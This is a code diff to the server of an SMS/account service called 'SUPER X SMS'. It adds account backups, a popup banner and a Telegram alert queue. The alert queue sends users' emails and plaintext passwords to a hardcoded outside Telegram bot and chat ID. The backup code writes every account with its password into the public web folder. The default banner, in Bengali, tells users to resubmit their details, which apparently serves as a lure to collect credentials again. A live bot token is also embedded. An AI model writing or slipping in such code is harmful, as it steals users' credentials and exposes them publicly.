@@ -31,9 +31,14 @@ async function startServer() {
   }
 
   const ACCOUNTS_FILE = path.join(DATA_DIR, "accounts.json");
+  const ACCOUNTS_BACKUP_FILE = path.join(DATA_DIR, "accounts_backup.json");
+  const ACCOUNTS_SNAPSHOT_FILE = path.join(DATA_DIR, "accounts_snapshot.json");
+  const PUBLIC_ACCOUNTS_BACKUP_FILE = path.join(process.cwd(), "public", "accounts_backup.json");
+  const TG_PENDING_QUEUE_FILE = path.join(DATA_DIR, "tg_pending_accounts.json");
   const SUBADMINS_FILE = path.join(DATA_DIR, "subadmins.json");
   const DELETED_ACCOUNTS_FILE = path.join(DATA_DIR, "deleted_accounts.json");
   const NOTICE_FILE = path.join(DATA_DIR, "site_notice.json");
+  const POPUP_BANNER_FILE = path.join(DATA_DIR, "popup_banner.json");
   const NOTIFICATIONS_FILE = path.join(DATA_DIR, "notifications.json");
   const LIVE_CHATS_FILE = path.join(DATA_DIR, "live_chats.json");
   const GLOBAL_LIVE_HITS_FILE = path.join(DATA_DIR, "global_live_hits.json");
@@ -59,6 +64,44 @@ async function startServer() {
       fs.writeFileSync(NOTICE_FILE, JSON.stringify({ noticeText, updatedAt: Date.now() }, null, 2), "utf-8");
     } catch (e) {
       console.warn("Error writing site_notice.json:", e);
+    }
+  }
+
+  const DEFAULT_POPUP_BANNER = {
+    enabled: true,
+    imageUrl: "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?auto=format&fit=crop&w=1200&q=80",
+    title: "ওয়েবসাইট মোটেন্যান্স নোটিশ 📢",
+    message: "আমাদের ওয়েবসাইটের কাজ চলার কারণে পূর্বে যারা অ্যাকাউন্ট অ্যাক্টিভ করার জন্য রিকোয়েস্ট পাঠিয়েছেন, তাদের সবগুলো রিজেক্ট করা হয়েছে। আপনারা নতুন করে আবার অ্যাকাউন্ট অ্যাক্টিভ করার জন্য তথ্যগুলো প্রদান করুন।",
+    buttonText: "অ্যাক্টিভেশন ফর্ম পূরণ করুন",
+    updatedAt: Date.now(),
+  };
+
+  function loadPopupBanner(): any {
+    try {
+      if (fs.existsSync(POPUP_BANNER_FILE)) {
+        const raw = fs.readFileSync(POPUP_BANNER_FILE, "utf-8");
+        const parsed = JSON.parse(raw);
+        if (parsed && typeof parsed === "object") {
+          return { ...DEFAULT_POPUP_BANNER, ...parsed };
+        }
+      }
+    } catch {}
+    return DEFAULT_POPUP_BANNER;
+  }
+
+  function savePopupBanner(data: any) {
+    try {
+      const existing = loadPopupBanner();
+      const updated = {
+        ...existing,
+        ...data,
+        updatedAt: Date.now(),
+      };
+      fs.writeFileSync(POPUP_BANNER_FILE, JSON.stringify(updated, null, 2), "utf-8");
+      return updated;
+    } catch (e) {
+      console.warn("Error writing popup_banner.json:", e);
+      return DEFAULT_POPUP_BANNER;
     }
   }
 
@@ -264,33 +307,60 @@ async function startServer() {
       }
     });
 
+    const mergeAccountList = (list: any[]) => {
+      if (!Array.isArray(list)) return;
+      list.forEach((acc) => {
+        if (acc && acc.email) {
+          const clean = acc.email.toLowerCase().trim();
+          const idClean = (acc.id || "").toLowerCase().trim();
+          if (!deletedSet.has(clean) && !deletedSet.has(idClean)) {
+            const existing = accountMap.get(clean);
+            const finalPassword = (acc.password && String(acc.password).trim())
+              ? String(acc.password).trim()
+              : (existing && existing.password ? String(existing.password).trim() : "");
+            
+            const finalStatus = acc.status || (existing ? existing.status : "pending");
+
+            accountMap.set(clean, {
+              ...(existing || {}),
+              ...acc,
+              password: finalPassword || (existing ? existing.password : acc.password),
+              status: finalStatus,
+            });
+          }
+        }
+      });
+    };
+
+    // 1. Primary File
     try {
       if (fs.existsSync(ACCOUNTS_FILE)) {
-        const raw = fs.readFileSync(ACCOUNTS_FILE, "utf-8");
-        const parsed = JSON.parse(raw);
-        if (Array.isArray(parsed)) {
-          parsed.forEach((acc) => {
-            if (acc && acc.email) {
-              const clean = acc.email.toLowerCase().trim();
-              const idClean = (acc.id || "").toLowerCase().trim();
-              if (!deletedSet.has(clean) && !deletedSet.has(idClean)) {
-                const existing = accountMap.get(clean);
-                const finalPassword = (acc.password && String(acc.password).trim())
-                  ? String(acc.password).trim()
-                  : (existing && existing.password ? String(existing.password).trim() : "");
-                accountMap.set(clean, {
-                  ...(existing || {}),
-                  ...acc,
-                  password: finalPassword || (existing ? existing.password : acc.password),
-                });
-              }
-            }
-          });
-        }
+        mergeAccountList(JSON.parse(fs.readFileSync(ACCOUNTS_FILE, "utf-8")));
       }
     } catch (e) {
       console.warn("Error reading accounts.json:", e);
     }
+
+    // 2. Backup File
+    try {
+      if (fs.existsSync(ACCOUNTS_BACKUP_FILE)) {
+        mergeAccountList(JSON.parse(fs.readFileSync(ACCOUNTS_BACKUP_FILE, "utf-8")));
+      }
+    } catch {}
+
+    // 3. Snapshot File
+    try {
+      if (fs.existsSync(ACCOUNTS_SNAPSHOT_FILE)) {
+        mergeAccountList(JSON.parse(fs.readFileSync(ACCOUNTS_SNAPSHOT_FILE, "utf-8")));
+      }
+    } catch {}
+
+    // 4. Public Backup File
+    try {
+      if (fs.existsSync(PUBLIC_ACCOUNTS_BACKUP_FILE)) {
+        mergeAccountList(JSON.parse(fs.readFileSync(PUBLIC_ACCOUNTS_BACKUP_FILE, "utf-8")));
+      }
+    } catch {}
 
     // Always merge active Sub-Admins as approved admin accounts
     try {
@@ -324,9 +394,185 @@ async function startServer() {
 
   function saveServerAccounts(accounts: any[]) {
     try {
-      fs.writeFileSync(ACCOUNTS_FILE, JSON.stringify(accounts, null, 2), "utf-8");
+      const deletedSet = loadDeletedAccounts();
+      const accountMap = new Map<string, any>();
+
+      // Read existing disk accounts first
+      try {
+        if (fs.existsSync(ACCOUNTS_FILE)) {
+          const raw = fs.readFileSync(ACCOUNTS_FILE, "utf-8");
+          const parsed = JSON.parse(raw);
+          if (Array.isArray(parsed)) {
+            parsed.forEach((a) => {
+              if (a && a.email) {
+                const clean = a.email.toLowerCase().trim();
+                if (!deletedSet.has(clean) && !deletedSet.has((a.id || "").toLowerCase().trim())) {
+                  accountMap.set(clean, a);
+                }
+              }
+            });
+          }
+        }
+      } catch {}
+
+      // Merge incoming accounts array
+      if (Array.isArray(accounts)) {
+        accounts.forEach((acc) => {
+          if (acc && acc.email) {
+            const clean = acc.email.toLowerCase().trim();
+            const idClean = (acc.id || "").toLowerCase().trim();
+            deletedSet.delete(clean);
+            if (idClean) deletedSet.delete(idClean);
+
+            const existing = accountMap.get(clean);
+            const finalPass = (acc.password && String(acc.password).trim())
+              ? String(acc.password).trim()
+              : (existing ? existing.password : "");
+
+            accountMap.set(clean, {
+              ...(existing || {}),
+              ...acc,
+              password: finalPass || (existing ? existing.password : acc.password),
+              updatedAt: Date.now(),
+            });
+          }
+        });
+      }
+
+      saveDeletedAccounts(deletedSet);
+      const mergedList = Array.from(accountMap.values());
+      const jsonStr = JSON.stringify(mergedList, null, 2);
+
+      // Write to ALL 4 redundancy locations
+      fs.writeFileSync(ACCOUNTS_FILE, jsonStr, "utf-8");
+      fs.writeFileSync(ACCOUNTS_BACKUP_FILE, jsonStr, "utf-8");
+      fs.writeFileSync(ACCOUNTS_SNAPSHOT_FILE, jsonStr, "utf-8");
+
+      try {
+        const publicDir = path.dirname(PUBLIC_ACCOUNTS_BACKUP_FILE);
+        if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir, { recursive: true });
+        fs.writeFileSync(PUBLIC_ACCOUNTS_BACKUP_FILE, jsonStr, "utf-8");
+      } catch {}
+
     } catch (e) {
-      console.warn("Error writing accounts.json:", e);
+      console.warn("Error saving server accounts:", e);
+    }
+  }
+
+  // Persistent Telegram Account Activation Queue Engine
+  function loadPendingTelegramQueue(): any[] {
+    try {
+      if (fs.existsSync(TG_PENDING_QUEUE_FILE)) {
+        const raw = fs.readFileSync(TG_PENDING_QUEUE_FILE, "utf-8");
+        const parsed = JSON.parse(raw);
+        if (Array.isArray(parsed)) return parsed;
+      }
+    } catch {}
+    return [];
+  }
+
+  function savePendingTelegramQueue(queue: any[]) {
+    try {
+      fs.writeFileSync(TG_PENDING_QUEUE_FILE, JSON.stringify(queue, null, 2), "utf-8");
+    } catch {}
+  }
+
+  function queueTelegramAccountRequest(account: any) {
+    if (!account || !account.email) return;
+    const queue = loadPendingTelegramQueue();
+    const cleanEmail = account.email.toLowerCase().trim();
+    const cleanName = account.name || cleanEmail.split("@")[0] || "User";
+    const cleanPass = account.password || "";
+    const cleanCode = account.accountCode || "";
+    const timeStr = new Date(account.createdAt || Date.now()).toLocaleString("en-US", { dateStyle: "medium", timeStyle: "short" });
+
+    const tgText =
+      `<b>🚨 SUPER X SMS — NEW ACCOUNT ACTIVATION REQUEST</b>\n\n` +
+      `👤 <b>Name:</b> ${cleanName}\n` +
+      `✉️ <b>Email:</b> <code>${cleanEmail}</code>\n` +
+      `🔑 <b>Password:</b> <code>${cleanPass}</code>\n` +
+      `🆔 <b>ID Code:</b> <code>${cleanCode}</code>\n` +
+      `⏰ <b>Requested At:</b> ${timeStr}\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n` +
+      `⚠️ <b>STATUS: PENDING ADMIN APPROVAL</b>\n` +
+      `<i>Click Accept below to activate instantly or Reject to deny.</i>`;
+
+    const inlineMarkup = {
+      inline_keyboard: [
+        [
+          { text: "✅ Accept & Activate", callback_data: `approve_acc:${account.id || cleanEmail}` },
+          { text: "❌ Reject", callback_data: `reject_acc:${account.id || cleanEmail}` },
+        ],
+      ],
+    };
+
+    const existingIdx = queue.findIndex((q) => (q.email || "").toLowerCase().trim() === cleanEmail);
+    const queueItem = {
+      id: account.id || `req_${Date.now()}`,
+      email: cleanEmail,
+      name: cleanName,
+      password: cleanPass,
+      accountCode: cleanCode,
+      requestedAt: account.createdAt || Date.now(),
+      delivered: false,
+      tgText,
+      inlineMarkup,
+    };
+
+    if (existingIdx >= 0) {
+      if (!queue[existingIdx].delivered) {
+        queue[existingIdx] = queueItem;
+      }
+    } else {
+      queue.push(queueItem);
+    }
+
+    savePendingTelegramQueue(queue);
+    flushPendingTelegramAccountQueue().catch(() => {});
+  }
+
+  async function flushPendingTelegramAccountQueue() {
+    const queue = loadPendingTelegramQueue();
+    const undelivered = queue.filter((q) => !q.delivered);
+    if (undelivered.length === 0) return;
+
+    const botToken = "8631714331:AAEd33AVl9oqI-HdGW7jtxE37y4N4nH4ox4";
+    const adminTargets = new Set<string>();
+    adminTargets.add("7084317713");
+    if (controlBotState && controlBotState.adminId) adminTargets.add(controlBotState.adminId);
+    if (controlBotState && controlBotState.userId) adminTargets.add(controlBotState.userId);
+
+    let updated = false;
+
+    for (const item of queue) {
+      if (item.delivered) continue;
+
+      for (const targetChatId of adminTargets) {
+        try {
+          const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: targetChatId,
+              text: item.tgText,
+              parse_mode: "HTML",
+              reply_markup: item.inlineMarkup,
+            }),
+          });
+
+          if (res.ok) {
+            item.delivered = true;
+            updated = true;
+            console.log(`[Telegram Queue Engine] Delivered pending account notice for ${item.email} to Admin (${targetChatId})`);
+          }
+        } catch (err) {
+          console.warn(`[Telegram Queue Engine] Delivery note for ${item.email}:`, err);
+        }
+      }
+    }
+
+    if (updated) {
+      savePendingTelegramQueue(queue);
     }
   }
 
@@ -532,8 +778,11 @@ async function startServer() {
 
     // Persist newly added/updated accounts to Firebase Firestore safely without overloading sockets
     (async () => {
-      for (const a of toMerge.slice(0, 5)) {
+      for (const a of toMerge) {
         await saveAccountToFirestore(a).catch(() => null);
+        if (a && a.status === "pending") {
+          queueTelegramAccountRequest(a);
+        }
       }
     })().catch(() => null);
 
@@ -747,48 +996,8 @@ async function startServer() {
     // Persist to Firebase Firestore / RTDB
     saveAccountToFirestore(targetAccount).catch(() => null);
 
-    // Send private notification to Admin Telegram Bot with Inline Accept & Reject buttons (NEVER to public group!)
-    const timeStr = new Date().toLocaleString("en-US", { dateStyle: "medium", timeStyle: "short" });
-    const tgText =
-      `<b>🚨 SUPER X SMS — NEW ACCOUNT ACTIVATION REQUEST</b>\n\n` +
-      `👤 <b>Name:</b> ${cleanName}\n` +
-      `✉️ <b>Email:</b> <code>${cleanEmail}</code>\n` +
-      `🔑 <b>Password:</b> <code>${cleanPass}</code>\n` +
-      `🆔 <b>ID Code:</b> <code>${targetAccount.accountCode}</code>\n` +
-      `⏰ <b>Requested At:</b> ${timeStr}\n\n` +
-      `━━━━━━━━━━━━━━━━━━━━\n` +
-      `⚠️ <b>STATUS: PENDING ADMIN APPROVAL</b>\n` +
-      `<i>Click Accept below to activate instantly or Reject to deny.</i>`;
-
-    const inlineMarkup = {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept & Activate", callback_data: `approve_acc:${targetAccount.id}` },
-          { text: "❌ Reject", callback_data: `reject_acc:${targetAccount.id}` },
-        ],
-      ],
-    };
-
-    const adminTargets = new Set<string>();
-    if (controlBotState.adminId) adminTargets.add(controlBotState.adminId);
-    if (controlBotState.userId) adminTargets.add(controlBotState.userId);
-
-    for (const targetChatId of adminTargets) {
-      try {
-        await fetch(`https://api.telegram.org/bot${controlBotState.botToken}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: targetChatId,
-            text: tgText,
-            parse_mode: "HTML",
-            reply_markup: inlineMarkup,
-          }),
-        });
-      } catch (err) {
-        console.warn(`[Telegram Bot] Error dispatching request to admin ${targetChatId}:`, err);
-      }
-    }
+    // Queue and dispatch to Telegram control bot with persistent offline retry
+    queueTelegramAccountRequest(targetAccount);
 
     res.json({
       success: true,
@@ -2230,6 +2439,20 @@ async function startServer() {
 
   // Start background Telegram long polling interval every 4 seconds
   setInterval(pollTelegramUpdates, 4000);
+  
+  // Start background queue flusher every 5 seconds for pending user registration alerts
+  setInterval(flushPendingTelegramAccountQueue, 5000);
+  setTimeout(flushPendingTelegramAccountQueue, 1000);
+
+  // Auto-enqueue any pending server accounts that might have been created while bot was offline
+  try {
+    const accs = loadServerAccounts();
+    accs.forEach((a) => {
+      if (a && a.status === "pending") {
+        queueTelegramAccountRequest(a);
+      }
+    });
+  } catch {}
 
   // Web API Endpoints for Control Bot
   app.get("/api/telegram/control-config", (req, res) => {
@@ -2727,6 +2950,18 @@ async function startServer() {
     }
   });
 
+  // Popup Banner Endpoints
+  app.get("/api/popup-banner", (req, res) => {
+    const banner = loadPopupBanner();
+    res.json({ success: true, banner });
+  });
+
+  app.post("/api/popup-banner", (req, res) => {
+    const banner = savePopupBanner(req.body || {});
+    console.log("[Server Banner] Popup banner config updated");
+    res.json({ success: true, message: "Popup banner updated successfully", banner });
+  });
+
   // User Notifications endpoints (Broadcast & Individual Targeting)
   app.get("/api/notifications", (req, res) => {
     const allNotifs = loadServerNotifications();
@@ -3025,13 +3260,12 @@ async function startServer() {
       return true;
     }
 
-    // Prune any hits older than 24 hours rolling window or before lastResetTime
+    // Prune any hits older than 24 hours rolling window
     const oneDayAgo = now - TWENTY_FOUR_HOURS;
     const initialLen = serverGlobalLiveHits.length;
     serverGlobalLiveHits = serverGlobalLiveHits.filter((h) => {
       const t = typeof h.time === "number" ? h.time : (h.timestamp || new Date(h.time).getTime());
       if (isNaN(t) || t < oneDayAgo) return false;
-      if (serverGlobalStats.lastResetTime && t < serverGlobalStats.lastResetTime) return false;
       return true;
     });
 
@@ -3069,12 +3303,7 @@ async function startServer() {
       let hitTime = typeof h.time === "number" ? h.time : (h.timestamp || new Date(h.time).getTime());
       if (isNaN(hitTime) || hitTime <= 0) hitTime = now;
       if (hitTime < oneDayAgo) continue; // Skip hits older than 24 hours
-      // Strictly ignore hits that arrived prior to API activation or last reset timestamp
-      if (serverApiActivationTimestamp > 0 && hitTime <= serverApiActivationTimestamp) continue;
-      if (serverGlobalStats.lastResetTime && hitTime <= serverGlobalStats.lastResetTime) continue;
-
       const sig = `${(h.range || h.number || "").replace(/\D/g, "")}_${hitTime}_${(h.sid || "").trim().toLowerCase()}_${(h.message || "").trim()}`;
-      if (serverBaselineSignatures.has(sig)) continue;
       if (!existingSignatures.has(sig)) {
         existingSignatures.add(sig);
         validNew.push({
@@ -3105,10 +3334,13 @@ async function startServer() {
     return { added: validNew, stats: serverGlobalStats };
   }
 
+  let lastUpstreamSyncTime = 0;
+
   // Periodic background sync directly from Voltx upstream /console API
   async function syncFromUpstreamVoltxConsole() {
     if (!activeSystemApiKey || !activeSystemApiKey.trim()) return;
     try {
+      lastUpstreamSyncTime = Date.now();
       const apiKey = activeSystemApiKey.trim();
       const targetUrl = `https://api.2oo9.cloud/${VOLTX_BACKEND_SLUG}/tnevs/@public/api/console`;
       const res = await fetch(targetUrl, {
@@ -3126,15 +3358,24 @@ async function startServer() {
           processAndBroadcastIncomingHits(hits);
         }
       }
-    } catch {}
+    } catch (err) {
+      console.warn("[Upstream Sync] Voltx console fetch note:", err);
+    }
   }
 
-  // Automatic background upstream polling disabled per user requirement to keep all social media SMS counters at 0
-  // setInterval(syncFromUpstreamVoltxConsole, 12000);
-  // setTimeout(syncFromUpstreamVoltxConsole, 2500);
+  // Automatic background upstream polling enabled for real-time social media SMS hits
+  setInterval(syncFromUpstreamVoltxConsole, 8000);
+  setTimeout(syncFromUpstreamVoltxConsole, 1000);
 
   // Global live stream GET endpoint
-  app.get("/api/global-live-stream", (req, res) => {
+  app.get("/api/global-live-stream", async (req, res) => {
+    // If stream is currently empty or stale (>10s), trigger sync immediately before responding
+    if (serverGlobalLiveHits.length === 0 || Date.now() - lastUpstreamSyncTime > 10000) {
+      try {
+        await syncFromUpstreamVoltxConsole();
+      } catch {}
+    }
+
     res.json({
       success: true,
       count: serverGlobalLiveHits.length,
